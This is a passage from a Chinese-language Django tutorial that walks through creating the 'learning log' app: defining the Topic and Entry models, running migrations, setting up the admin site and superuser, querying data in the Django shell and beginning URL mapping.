<p>上图中的命令中，Django指出它将创建必要的数据库表，用于存储我们将在这个项目（Synchronizeunmigrated apps，同步未迁移的应用程序）中使用的信息，再确保数据库结构与当前代码（Apply all migrations，应用所有的迁移）匹配。</p>
<p>接着，我们运行了命令dir，其输出表明Django又创建了一个文件——db.sqlite3。SQLite是一种使用单个文件的数据库，是编写简单应用程序的理想选择，因为它让你不用太关注数据库管理的问题。</p>
<h4 id="（八）查看项目"><a href="#（八）查看项目" class="headerlink" title="（八）查看项目"></a>（八）查看项目</h4><p>下面来核实Django是否正确地创建了项目。为此，可执行命令runserver，如下所示：</p>
<pre><code>python3 manage.py runserver</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210312202314.png" alt="image-20210307143629157"></p>
<p>Django启动一个服务器，让你能够查看系统中的项目，了解它们的工作情况。当你在浏览器中输入URL以请求网页时，该Django服务器将进行响应：生成合适的网页，并将其发送给浏览器。</p>
<p>在❶处，Django通过检查确认正确地创建了项目；在❷处，它指出了使用的Django版本以及当前使用的设置文件的名称；在❸处，它指出了项目的URL。URL <a href="http://127.0.0.1:8000/表明项目将在你的计算机（即localhost）的端口8000上侦听请求。localhost是一种只处理当前系统发出的请求，而不允许其他任何人查看你正在开发的网页的服务器。">http://127.0.0.1:8000/表明项目将在你的计算机（即localhost）的端口8000上侦听请求。localhost是一种只处理当前系统发出的请求，而不允许其他任何人查看你正在开发的网页的服务器。</a></p>
<p>现在打开一款Web浏览器，并输入URL：<a href="http://localhost:8000/；如果这不管用，请输入http://127.0.0.1:8000/。你将看到类似于下图所示的页面，这个页面是Django创建的，让你知道到目前为止一切正常。现在暂时不要关闭这个服务器。若要关闭这个服务器，按Ctrl+C即可。">http://localhost:8000/；如果这不管用，请输入http://127.0.0.1:8000/。你将看到类似于下图所示的页面，这个页面是Django创建的，让你知道到目前为止一切正常。现在暂时不要关闭这个服务器。若要关闭这个服务器，按Ctrl+C即可。</a></p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210312202315.png" alt="image-20210307144232873"></p>
<blockquote>
<p>注意　如果出现错误消息“That port is already in use”（指定端口已被占用），请执行命令python manage.pyrunserver 8001，让Diango使用另一个端口；如果这个端口也不可用，请不断执行上述命令，并逐渐增大其中的端口号，直到找到可用的端口。</p>
</blockquote>
<h4 id="动手试一试"><a href="#动手试一试" class="headerlink" title="动手试一试"></a>动手试一试</h4><h5 id="18-1-新项目："><a href="#18-1-新项目：" class="headerlink" title="18-1 新项目："></a>18-1 新项目：</h5><p>为更深入地了解Django做了些什么，可创建两个空项目，看看Django创建了什么。新建一个文件夹，并给它指定简单的名称，如InstaBook或FaceGram（不要在目录learning_log中新建该文件夹），在终端中切换到该文件夹，并创建一个虚拟环境。在这个虚拟环境中安装Django，并执行命令django-admin.py startprojectinstabook.（千万不要忘了这个命令末尾的句点）。</p>
<p>看看这个命令创建了哪些文件和文件夹，并与项目“学习笔记”包含的文件和文件夹进行比较。这样多做几次，直到对Django新建项目时创建的东西了如指掌。然后，将项目目录删除——如果你想这样做的话。</p>
<h3 id="二、创建应用程序"><a href="#二、创建应用程序" class="headerlink" title="二、创建应用程序"></a>二、创建应用程序</h3><p><strong>Django项目</strong>由一系列应用程序组成，它们协同工作，让项目成为一个整体。我们暂时只创建一个应用程序，它将完成项目的大部分工作。在第19章，我们将再添加一个管理用户账户的应用程序。</p>
<p>当前，在前面打开的终端窗口中应该还运行着runserver。请再打开一个终端窗口（或标签页），并切换到manage.py所在的目录。激活该虚拟环境，再执行命令startapp：</p>
<pre><code>python3 manage.py startapp learning_logs</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210312202316.png" alt="image-20210307154206402"></p>
<p>命令startapp appname让Django建立创建应用程序所需的基础设施。</p>
<p>如果现在查看项目目录，将看到其中新增了一个文件夹learning_logs（见❶）。打开这个文件夹，看看Django都创建了什么（见❷）。其中最重要的文件是models.py、admin.py和views.py。我们将<strong>使用models.py来定义我们要在应用程序中管理的数据</strong>。admin.py和views.py将在稍后介绍。</p>
<h4 id="（一）定义模型"><a href="#（一）定义模型" class="headerlink" title="（一）定义模型"></a>（一）定义模型</h4><p>我们来想想涉及的数据。每位用户都需要在学习笔记中创建很多主题。用户输入的每个条目都与特定主题相关联，这些条目将以文本的方式显示。我们还需要存储每个条目的时间戳，以便能够告诉用户各个条目都是什么时候创建的。</p>
<p>打开文件models.py，看看它当前包含哪些内容：</p>
<p>models.py</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210312202317.png" alt="image-20210307155311360"></p>
<p>这为我们导入了模块models，还让我们创建自己的模型。模型告诉Django如何处理应用程序中存储的数据。在代码层面，模型就是一个类，就像前面讨论的每个类一样，包含属性和方法。下面是表示用户将要存储的主题的模型：</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> django<span class="token punctuation">.</span>db <span class="token keyword">import</span> models

<span class="token comment" spellcheck="true"># Create your models here.</span>
<span class="token keyword">class</span> <span class="token class-name">Topic</span><span class="token punctuation">(</span>models<span class="token punctuation">.</span>Model<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""用户学习的主题"""</span>
    text <span class="token operator">=</span> models<span class="token punctuation">.</span>CharField<span class="token punctuation">(</span>max_length<span class="token operator">=</span><span class="token number">200</span><span class="token punctuation">)</span>
    date_added <span class="token operator">=</span> models<span class="token punctuation">.</span>DateTimeField<span class="token punctuation">(</span>auto_now_add<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">__str__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""返回模型的字符串表示"""</span>
    <span class="token keyword">return</span> self<span class="token punctuation">.</span>text
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210312202318.png" alt="image-20210307160948131"></p>
<p>我们创建了一个名为Topic的类，它继承了Model——Django中一个定义了模型基本功能的类。Topic类只有两个属性：text和date_added。属性text是一个CharField——由字符或文本组成的数据（见❶）。需要存储少量的文本，如名称、标题或城市时，可使用CharField。定义CharField属性时，必须告诉Django该在数据库中预留多少空间。在这里，我们将max_length设置成了200（即200个字符），这对存储大多数主题名来说足够了。</p>
<p>属性date_added是一个DateTimeField——记录日期和时间的数据（见❷）。我们传递了实参auto_now_add=True，每当用户创建新主题时，这都让Django将这个属性自动设置成当前日期和时间。</p>
<blockquote>
<p>注意　要获悉可在模型中使用的各种字段，请参阅DjangoModel Field Reference（Django模型字段参考），其网址为<a href="https://docs.djangoproject.com/en/1.8/ref/models/fields/。就当前而言，你无需全面了解其中的所有内容，但自己开发应用程序时，这些内容会提供极大的帮助。">https://docs.djangoproject.com/en/1.8/ref/models/fields/。就当前而言，你无需全面了解其中的所有内容，但自己开发应用程序时，这些内容会提供极大的帮助。</a></p>
</blockquote>
<p>我们需要告诉Django，默认应使用哪个属性来显示有关主题的信息。Django调用方法<strong>str</strong>()来显示模型的简单表示。在这里，我们编写了方法<strong>str</strong>()，它返回存储在属性text中的字符串（见❸）。</p>
<blockquote>
<p>注意　如果你使用的是Python 2.7，应调用方法<strong>unicode</strong>()，而不是<strong>str</strong>()，但其中的代码相同。</p>
</blockquote>
<h4 id="（二）激活模型"><a href="#（二）激活模型" class="headerlink" title="（二）激活模型"></a>（二）激活模型</h4><p>要使用模型，必须让Django将应用程序包含到项目中。为此，打开settings.py（它位于目录learning_log/learning_log中），你将看到一个这样的片段，即告诉Django哪些应用程序安装在项目中：</p>
<p>settings.py</p>
<pre><code>INSTALLED_APPS = [
    'django.contrib.admin',
    'django.contrib.auth',
    'django.contrib.contenttypes',
    'django.contrib.sessions',
    'django.contrib.messages',
    'django.contrib.staticfiles',
]</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210312202319.png" alt="image-20210307170740014"></p>
<p>这是一个元组，告诉Django项目是由哪些应用程序组成的。请将INSTALLED_APPS修改成下面这样，将前面的应用程序添加到这个元组中：</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210312202320.png" alt="image-20210307174623657"></p>
<pre class="line-numbers language-python"><code class="language-python">INSTALLED_APPS <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token operator">-</span><span class="token operator">-</span>snip<span class="token operator">-</span><span class="token operator">-</span> <span class="token comment" spellcheck="true">#省略上面代码</span>
    <span class="token string">'django.contrib.staticfiles'</span><span class="token punctuation">,</span>
    <span class="token comment" spellcheck="true">#我的应用程序</span>
    <span class="token string">'learning_logs'</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>通过将应用程序编组，在项目不断增大，包含更多的应用程序时，有助于对应用程序进行跟踪。这里新建了一个名为Myapps的片段，当前它只包含应用程序learning_logs。接下来，需要让Django修改数据库，使其能够存储与模型Topic相关的信息。为此，在终端窗口中执行下面的命令：</p>
<pre><code>python3 manage.py makemigrations learning_logs</code></pre><blockquote>
<p>注意：</p>
<p>如果出现</p>
<pre><code>LookupError: No installed app with label 'admin'.</code></pre><p>的报错，则说明是上面的settings.py文件设置格式出现错误</p>
</blockquote>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210312202321.png" alt="image-20210307193335606"></p>
<p>命令makemigrations让Django确定该如何修改数据库，使其能够存储与我们定义的新模型相关联的数据。输出表明Django创建了一个名为0001_initial.py的迁移文件，这个文件将在数据库中为模型Topic创建一个表。</p>
<p>下面来应用这种迁移，让Django替我们修改数据库：</p>
<pre><code>python3 manage.py migrate</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210312202322.png" alt="image-20210307194038969"></p>
<p>这个命令的大部分输出都与我们首次执行命令migrate的输出相同。我们需要检查的是❶处的输出行，在这里，Django确认为learning_logs应用迁移时一切正常（OK）。</p>
<p><strong>每当需要修改“学习笔记”管理的数据时，都采取如下三个步骤：修改models.py；对learning_logs调用makemigrations；让Django迁移项目。</strong></p>
<h4 id="（三）Django管理网站"><a href="#（三）Django管理网站" class="headerlink" title="（三）Django管理网站"></a>（三）Django管理网站</h4><p>为应用程序定义模型时，Django提供的管理网站（adminsite）让你能够轻松地处理模型。网站的管理员可使用管理网站，但普通用户不能使用。在本节中，我们将建立管理网站，并通过它使用模型Topic来添加一些主题。</p>
<h5 id="1．创建超级用户"><a href="#1．创建超级用户" class="headerlink" title="1．创建超级用户"></a>1．创建超级用户</h5><p>Django允许你创建具备所有权限的用户——超级用户。权限决定了用户可执行的操作。最严格的权限设置只允许用户阅读网站的公开信息；注册了的用户通常可阅读自己的私有数据，还可查看一些只有会员才能查看的信息。为有效地管理Web应用程序，网站所有者通常需要访问网站存储的所有信息。优秀的管理员会小心对待用户的敏感信息，因为用户对其访问的应用程序有极大的信任。</p>
<p>为在Django中创建超级用户，请执行下面的命令并按提示做：</p>
<pre><code>python3 manage.py createsuperuser</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210312202323.png" alt="image-20210307200148903"></p>
<p>你执行命令createsuperuser时，Django提示你输入超级用户的用户名（见❶）。这里我们输入的是ll_admin，但你可以输入任何用户名，比如电子邮件地址，也可让这个字段为空（见❷）。你需要输入密码两次（见❸）。</p>
<blockquote>
<p>注意　可能会对网站管理员隐藏有些敏感信息。例如，Django并不存储你输入的密码，而存储从该密码派生出来的一个字符串——散列值。每当你输入密码时，Django都计算其散列值，并将结果与存储的散列值进行比较。如果这两个散列值相同，就通过了身份验证。通过存储散列值，即便黑客获得了网站数据库的访问权，也只能获取其中存储的散列值，而无法获得密码。在网站配置正确的情况下，几乎无法根据散列值推导出原始密码。</p>
</blockquote>
<h5 id="2．向管理网站注册模型"><a href="#2．向管理网站注册模型" class="headerlink" title="2．向管理网站注册模型"></a>2．向管理网站注册模型</h5><p>Django自动在管理网站中添加了一些模型，如User和Group，但对于我们创建的模型，必须手工进行注册。</p>
<p>我们创建应用程序learning_logs时，Django在models.py所在的目录中创建了一个名为admin.py的文件：</p>
<p>admin.py</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> django<span class="token punctuation">.</span>contrib <span class="token keyword">import</span> admin

<span class="token comment" spellcheck="true"># Register your models here.</span>
<span class="token keyword">from</span> learning_logs<span class="token punctuation">.</span>models <span class="token keyword">import</span> Topic
admin<span class="token punctuation">.</span>site<span class="token punctuation">.</span>register<span class="token punctuation">(</span>Topic<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210312202324.png" alt="image-20210307203319723"></p>
<p>这些代码导入我们要注册的模型Topic（见❶），再使用admin.site.register()（见❷）让Django通过管理网站管理我们的模型。</p>
<p>现在，使用超级用户账户访问管理网站：访问<a href="http://localhost:8000/admin/，并输入你刚创建的超级用户的用户名和密码，你将看到类似于下图所示的屏幕。这个网页让你能够添加和修改用户和用户组，还可以管理与刚才定义的模型Topic相关的数据。">http://localhost:8000/admin/，并输入你刚创建的超级用户的用户名和密码，你将看到类似于下图所示的屏幕。这个网页让你能够添加和修改用户和用户组，还可以管理与刚才定义的模型Topic相关的数据。</a></p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210312202325.png" alt="包含模型Topic的管理网站"></p>
<blockquote>
<p>注意　如果你在浏览器中看到一条消息，指出访问的网页不可用，请确认你在终端窗口中运行着Django服务器。如果没有，请激活虚拟环境，并执行命令python manage.py runserver。</p>
</blockquote>
<h5 id="3．添加主题"><a href="#3．添加主题" class="headerlink" title="3．添加主题"></a>3．添加主题</h5><p>向管理网站注册Topic后，我们来添加第一个主题。为此，单击Topics进入主题网页，它几乎是空的，这是因为我们还没有添加任何主题。单击Add，你将看到一个用于添加新主题的表单。在第一个方框中输入Chess，再单击Save，这将返回到主题管理页面，其中包含刚创建的主题。下面再创建一个主题，以便有更多的数据可供使用。再次单击Add，并创建另一个主题Rock Climbing。当你单击Save时，将重新回到主题管理页面，其中包含主题Chess和RockClimbing。</p>
<h4 id="（四）定义模型Entry"><a href="#（四）定义模型Entry" class="headerlink" title="（四）定义模型Entry"></a>（四）定义模型Entry</h4><p>要记录学到的国际象棋和攀岩知识，需要为用户可在学习笔记中添加的条目定义模型。每个条目都与特定主题相关联，这种关系被称为多对一关系，即多个条目可关联到同一个主题。</p>
<p>下面是模型Entry的代码：</p>
<p>models.py</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> django<span class="token punctuation">.</span>db <span class="token keyword">import</span> models
<span class="token keyword">class</span> <span class="token class-name">Topic</span><span class="token punctuation">(</span>models<span class="token punctuation">.</span> Model<span class="token punctuation">)</span> <span class="token punctuation">:</span>
    <span class="token operator">-</span><span class="token operator">-</span>snip<span class="token operator">-</span><span class="token operator">-</span>
<span class="token keyword">class</span> <span class="token class-name">Entry</span><span class="token punctuation">(</span>models<span class="token punctuation">.</span>Model<span class="token punctuation">)</span><span class="token punctuation">:</span>➊
    <span class="token triple-quoted-string string">"""学到的有关某个主题的具体知识"""</span>
    topic <span class="token operator">=</span> models<span class="token punctuation">.</span>ForeignKey<span class="token punctuation">(</span>Topic<span class="token punctuation">)</span>❷
    text <span class="token operator">=</span> models<span class="token punctuation">.</span>TextField<span class="token punctuation">(</span><span class="token punctuation">)</span>❸
    date_added <span class="token operator">=</span> models<span class="token punctuation">.</span>DateTimeField<span class="token punctuation">(</span>auto_now_add<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
    <span class="token keyword">class</span> <span class="token class-name">Meta</span><span class="token punctuation">:</span> ❹
        verbose_name_plural <span class="token operator">=</span> <span class="token string">'entries'</span>
    <span class="token keyword">def</span> <span class="token function">__str__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">"""返回模型的字符串表示"""</span>
        <span class="token keyword">return</span> self<span class="token punctuation">.</span>text<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"..."</span>❺
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>像Topic一样，Entry也继承了Django基类Model（见❶）。第一个属性topic是一个ForeignKey实例（见❷）。外键是一个数据库术语，它引用了数据库中的另一条记录；这些代码将每个条目关联到特定的主题。每个主题创建时，都给它分配了一个键（或ID）。需要在两项数据之间建立联系时，Django使用与每项信息相关联的键。稍后我们将根据这些联系获取与特定主题相关联的所有条目。</p>
<p>接下来是属性text，它是一个TextField实例（见❸）。这种字段不需要长度限制，因为我们不想限制条目的长度。属性date_added让我们能够按创建顺序呈现条目，并在每个条目旁边放置时间戳。</p>
<p>在❹处，我们在Entry类中嵌套了Meta类。Meta存储用于管理模型的额外信息，在这里，它让我们能够设置一个特殊属性，让Django在需要时使用Entries来表示多个条目。如果没有这个类， Django将使用Entrys来表示多个条目。最后，方法<strong>str</strong>()告诉Django，呈现条目时应显示哪些信息。由于条目包含的文本可能很长，我们让Django只显示text的前50个字符（见❺）。我们还添加了一个省略号，指出显示的并非整个条目。</p>
<h4 id="（五）迁移模型Entry"><a href="#（五）迁移模型Entry" class="headerlink" title="（五）迁移模型Entry"></a>（五）迁移模型Entry</h4><p>由于我们添加了一个新模型，因此需要再次<strong>迁移数据库</strong>。你将慢慢地对这个过程了如指掌：</p>
<p>修改models.py，执行命令</p>
<pre><code>python manage.py makemigrations app_name</code></pre><p>出现报错</p>
<pre><code>TypeError: __init__() missing 1 required positional argument: 'on_delete'</code></pre><p>解决方案：<br>定义外键的时候需要加上 on_delete=;<br>即：contract = models.ForeignKey(Contract, on_delete=models.CASCADE)</p>
<p>原因如下：<br>django 升级到2.0之后,表与表之间关联的时候,必须要写on_delete参数,否则会报异常:<br>TypeError: init() missing 1 required positional argument: ‘on_delete’</p>
<blockquote>
<p>on_delete各个参数的含义如下：</p>
<p>on_delete=None,        # 删除关联表中的数据时,当前表与其关联的field的行为<br>on_delete=models.CASCADE,   # 删除关联数据,与之关联也删除<br>on_delete=models.DO_NOTHING,  # 删除关联数据,什么也不做<br>on_delete=models.PROTECT,   # 删除关联数据,引发错误ProtectedError<br># models.ForeignKey(‘关联表’, on_delete=models.SET_NULL, blank=True, null=True)<br>on_delete=models.SET_NULL,   # 删除关联数据,与之关联的值设置为null（前提FK字段需要设置为可空,一对一同理）<br># models.ForeignKey(‘关联表’, on_delete=models.SET_DEFAULT, default=’默认值’)<br>on_delete=models.SET_DEFAULT, # 删除关联数据,与之关联的值设置为默认值（前提FK字段需要设置默认值,一对一同理）<br>on_delete=models.SET,     # 删除关联数据,<br>a. 与之关联的值设置为指定值,设置：models.SET(值)<br>b. 与之关联的值设置为可执行对象的返回值,设置：models.SET(可执行对象)</p>
</blockquote>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210312202326.png" alt="image-20210308203811344"></p>
<p>修改后，再执行命令成功</p>
<pre><code>python3 manage.py migrate</code></pre><p>下面来迁移数据库并查看输出：</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210312202327.png" alt="image-20210308205019813"></p>
<p>生成了一个新的迁移文件——0002_entry.py，它告诉Django如何修改数据库，使其能够存储与模型Entry相关的信息（见❶）。执行命令migrate，我们发现Django应用了这种迁移且一切顺利（见❷）。</p>
<h4 id="（六）向管理网站注册Entry"><a href="#（六）向管理网站注册Entry" class="headerlink" title="（六）向管理网站注册Entry"></a>（六）向管理网站注册Entry</h4><p>我们还需要注册模型Entry。为此，需要将admin.py修改成类似于下面这样：</p>
<pre><code>from django.contrib import admin
from learning_logs.models import Topic,Entry
admin.site.register(Topic)
admin.site.register(Entry)</code></pre><p>返回到<a href="http://localhost:8000/admin/，你将看到learning_logs下列出了Entries。单击Entries的Add链接，或者单击Entries再选择Add">http://localhost:8000/admin/，你将看到learning_logs下列出了Entries。单击Entries的Add链接，或者单击Entries再选择Add</a> entry。你将看到一个下拉列表，让你能够选择要为哪个主题创建条目，还有一个用于输入条目的文本框。从下拉列表中选择Chess，并添加一个条目。下面是我添加的第一个条目。</p>
<blockquote>
<p>The opening is the first part of the game, roughly thefirst ten moves or so. In the opening, it’s a good ideato do three things— bring out your bishops andknights, try to control the center of the board, andcastle your king.（国际象棋的第一个阶段是开局，大致是前10步左右。在开局阶段，最好做三件事情：将象和马调出来；努力控制棋盘的中间区域；用车将王护住。）Of course, these are just guidelines. It will beimportant to learn when to follow these guidelinesand when to disregard these suggestions.（当然，这些只是指导原则。学习什么情况下遵守这些原则、什么情况下不用遵守很重要。）</p>
</blockquote>
<p>当你单击Save时，将返回到主条目管理页面。在这里，你将发现使用text[:50]作为条目的字符串表示的好处：管理界面中，只显示了条目的开头部分而不是其所有文本，这使得管理多个条目容易得多。</p>
<p>再来创建一个国际象棋条目，并创建一个攀岩条目，以提供一些初始数据。下面是第二个国际象棋条目。</p>
<blockquote>
<p>In the opening phase of the game, it’s important tobring out your bishops and knights. These pieces arepowerful and maneuverable enough to play asignificant role in the beginning moves of a game.（在国际象棋的开局阶段，将象和马调出来很重要。这些棋子威力大，机动性强，在开局阶段扮演着重要角色。）</p>
</blockquote>
<p>下面是第一个攀岩条目：</p>
<blockquote>
<p>One of the most important concepts in climbing is tokeep your weight on your feet as much as possible.There’s a myth that climbers can hang all day on theirarms. In reality, good climbers have practiced specificways of keeping their weight over their feet wheneverpossible.（最重要的攀岩概念之一是尽可能让双脚承受体重。有谬误认为攀岩者能依靠手臂的力量坚持一整天。实际上，优秀的攀岩者都经过专门训练，能够尽可能让双脚承受体重。）</p>
</blockquote>
<p>继续往下开发“学习笔记”时，这三个条目可为我们提供使用的数据。</p>
<h4 id="（七）Django-shell"><a href="#（七）Django-shell" class="headerlink" title="（七）Django shell"></a>（七）Django shell</h4><p>输入一些数据后，就可通过交互式终端会话以编程方式查看这些数据了。这种交互式环境称为Django shell，是测试项目和排除其故障的理想之地。下面是一个交互式shell会话示例：</p>
<pre><code>python3 manage.py shell</code></pre><pre><code>from learning_logs.models import Topic

Topic.objects.all()</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210312202328.png" alt="image-20210309171149682"></p>
<p>在活动的虚拟环境中执行时，命令python manage.py shell启动一个Python解释器，可使用它来探索存储在项目数据库中的数据。在这里，我们导入了模块learning_logs.models中的模型Topic（见❶），然后使用方法Topic.objects.all()来获取模型Topic的所有实例；它返回的是一个列表，称为查询集（queryset）。</p>
<p>我们可以像遍历列表一样遍历查询集。下面演示了如何查看分配给每个主题对象的ID：</p>
<pre class="line-numbers language-python"><code class="language-python">topics <span class="token operator">=</span> Topic<span class="token punctuation">.</span>objects<span class="token punctuation">.</span>all<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> topic <span class="token keyword">in</span> topics<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>topic<span class="token punctuation">.</span>id<span class="token punctuation">,</span>topic<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210312202329.png" alt="image-20210309172453359"></p>
<p>我们将返回的查询集存储在topics中，然后打印每个主题的id属性和字符串表示。从输出可知，主题Chess的ID为1，而RockClimbing的ID为2。</p>
<p>知道对象的ID后，就可获取该对象并查看其任何属性。下面来看看主题Chess的属性text和date_added的值：</p>
<pre><code>t = Topic.objects.get(id=1)
t.text
t.date_added</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210312202330.png" alt="image-20210309172741839"></p>
<p>我们还可以查看与主题相关联的条目。前面我们给模型Entry定义了属性topic，这是一个ForeignKey，将条目与主题关联起来。利用这种关联，Django能够获取与特定主题相关联的所有条目，如下所示：</p>
<pre><code>t.entry_set.all()</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210312202331.png" alt="image-20210309172951882"></p>
<p>为通过外键关系获取数据，可使用相关模型的小写名称、下划线和单词set（见❶）。例如，假设你有模型Pizza和Topping，而Topping通过一个外键关联到Pizza；如果你有一个名为my_pizza的对象，表示一张比萨，就可使用代码my_pizza.topping_set.all()来获取这张比萨的所有配料。</p>
<p>编写用户可请求的网页时，我们将使用这种语法。确认代码能获取所需的数据时，shell很有帮助。如果代码在shell中的行为符合预期，那么它们在项目文件中也能正确地工作。如果代码引发了错误或获取的数据不符合预期，那么在简单的shell环境中排除故障要比在生成网页的文件中排除故障容易得多。我们不会太多地使用shell，但应继续使用它来熟悉对存储在项目中的数据进行访问的Django语法。</p>
<blockquote>
<p>注意　每次修改模型后，你都需要重启shell，这样才能看到修改的效果。要退出shell会话，可按Ctr+D；如果你使用的是Windows系统，应按Ctr+Z，再按回车键。</p>
</blockquote>
<h4 id="动手试一试-1"><a href="#动手试一试-1" class="headerlink" title="动手试一试"></a>动手试一试</h4><h5 id="18-2-简短的条目："><a href="#18-2-简短的条目：" class="headerlink" title="18-2 简短的条目："></a>18-2 简短的条目：</h5><p>当前，Django在管理网站或shell中显示Entry实例时，模型Entry的方法<strong>str</strong>()都在它的末尾加上省略号。请在方法<strong>str</strong>()中添加一条if语句，以便仅在条目长度超过50字符时才添加省略号。使用管理网站来添加一个长度少于50字符的条目，并核实显示它时没有省略号。</p>
<h5 id="18-3-Django-API："><a href="#18-3-Django-API：" class="headerlink" title="18-3 Django API："></a>18-3 Django API：</h5><p>编写访问项目中的数据的代码时，你编写的是查询。请浏览有关如何查询数据的文档，其网址为<a href="https://docs.djangoproject.com/en/7.8/topics/db/queries/。其中大部分内容都是你不熟悉的，但等你自己开发项目时，这些内容会很有用。">https://docs.djangoproject.com/en/7.8/topics/db/queries/。其中大部分内容都是你不熟悉的，但等你自己开发项目时，这些内容会很有用。</a></p>
<h5 id="18-4-比萨店："><a href="#18-4-比萨店：" class="headerlink" title="18-4 比萨店："></a>18-4 比萨店：</h5><p>新建一个名为pizzeria的项目，并在其中添加一个名为pizzas的应用程序。定义一个名为Pizza的模型，它包含字段name，用于存储比萨名称，如Hawaiian和Meat Lovers。定义一个名为Topping的模型，它包含字段pizza和name，其中字段pizza是一个关联到Pizza的外键，而字段name用于存储配料，如pineapple、Canadianbacon和sausage。</p>
<p>向管理网站注册这两个模型，并使用管理网站输入一些比萨名和配料。使用shell来查看你输入的数据。</p>
<h3 id="三、创建网页："><a href="#三、创建网页：" class="headerlink" title="三、创建网页："></a>三、创建网页：</h3><p>学习笔记主页使用Django创建网页的过程通常分三个阶段：定义URL、编写视图和编写模板。首先，你必须定义URL模式。URL模式描述了URL是如何设计的，让Django知道如何将浏览器请求与网站URL匹配，以确定返回哪个网页。</p>
<p>每个URL都被映射到特定的视图——视图函数获取并处理网页所需的数据。视图函数通常调用一个模板，后者生成浏览器能够理解的网页。为明白其中的工作原理，我们来创建学习笔记的主页。我们将定义该主页的URL、编写其视图函数并创建一个简单的模板。</p>
<p>鉴于我们只是要确保“学习笔记”按要求的那样工作，我们将暂时让这个网页尽可能简单。Web应用程序能够正常运行后，设置样式可使其更有趣，但中看不中用的应用程序毫无意义。就目前而言，主页只显示标题和简单的描述。</p>
<h4 id="（一）映射URL"><a href="#（一）映射URL" class="headerlink" title="（一）映射URL"></a>（一）映射URL</h4><p>用户通过在浏览器中输入URL以及单击链接来请求网页，因此我们需要确定项目需要哪些URL。主页的URL最重要，它是用户用来访问项目的基础URL。当前，基础URL（<a href="http://localhost:8000/）返回默认的Django网站，让我们知道正确地建立了项目。我们将修改这一点，将这个基础URL映射到“学习笔记”的主页。">http://localhost:8000/）返回默认的Django网站，让我们知道正确地建立了项目。我们将修改这一点，将这个基础URL映射到“学习笔记”的主页。</a></p>
<p>打开项目主文件夹learning_log中的文件urls.py，你将看到如下代码：</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> django<span class="token punctuation">.</span>contrib <span class="token keyword">import</span> admin❶
<span class="token keyword">from</span> django<span class="token punctuation">.</span>urls <span class="token keyword">import</span> path

urlpatterns <span class="token operator">=</span> <span class="token punctuation">[</span>❷
    path<span class="token punctuation">(</span><span class="token string">'admin/'</span><span class="token punctuation">,</span> admin<span class="token punctuation">.</span>site<span class="token punctuation">.</span>urls<span class="token punctuation">)</span><span class="token punctuation">,</span>❸
<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>前两行导入了为项目和管理网站管理URL的函数和模块（见❶）。这个文件的主体定义了变量urlpatterns（见❷）。在这个针对整个项目的urls.py文件中，变量urlpatterns包含项目中的应用程序的URL。❸处的代码包含模块admin.site.urls，该模块定义了可在管理网站中请求的所有URL。</p>
<p>我们需要包含learning_logs的URL：</p>
<p>原有代码</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> django<span class="token punctuation">.</span>contrib <span class="token keyword">import</span> admin
<span class="token keyword">from</span> django<span class="token punctuation">.</span>urls <span class="token keyword">import</span> path

urlpatterns <span class="token operator">=</span> <span class="token punctuation">[</span>
    path<span class="token punctuation">(</span><span class="token string">'admin/'</span><span class="token punctuation">,</span> admin<span class="token punctuation">.</span>site<span class="token punctuation">.</span>urls<span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>修改后</p>
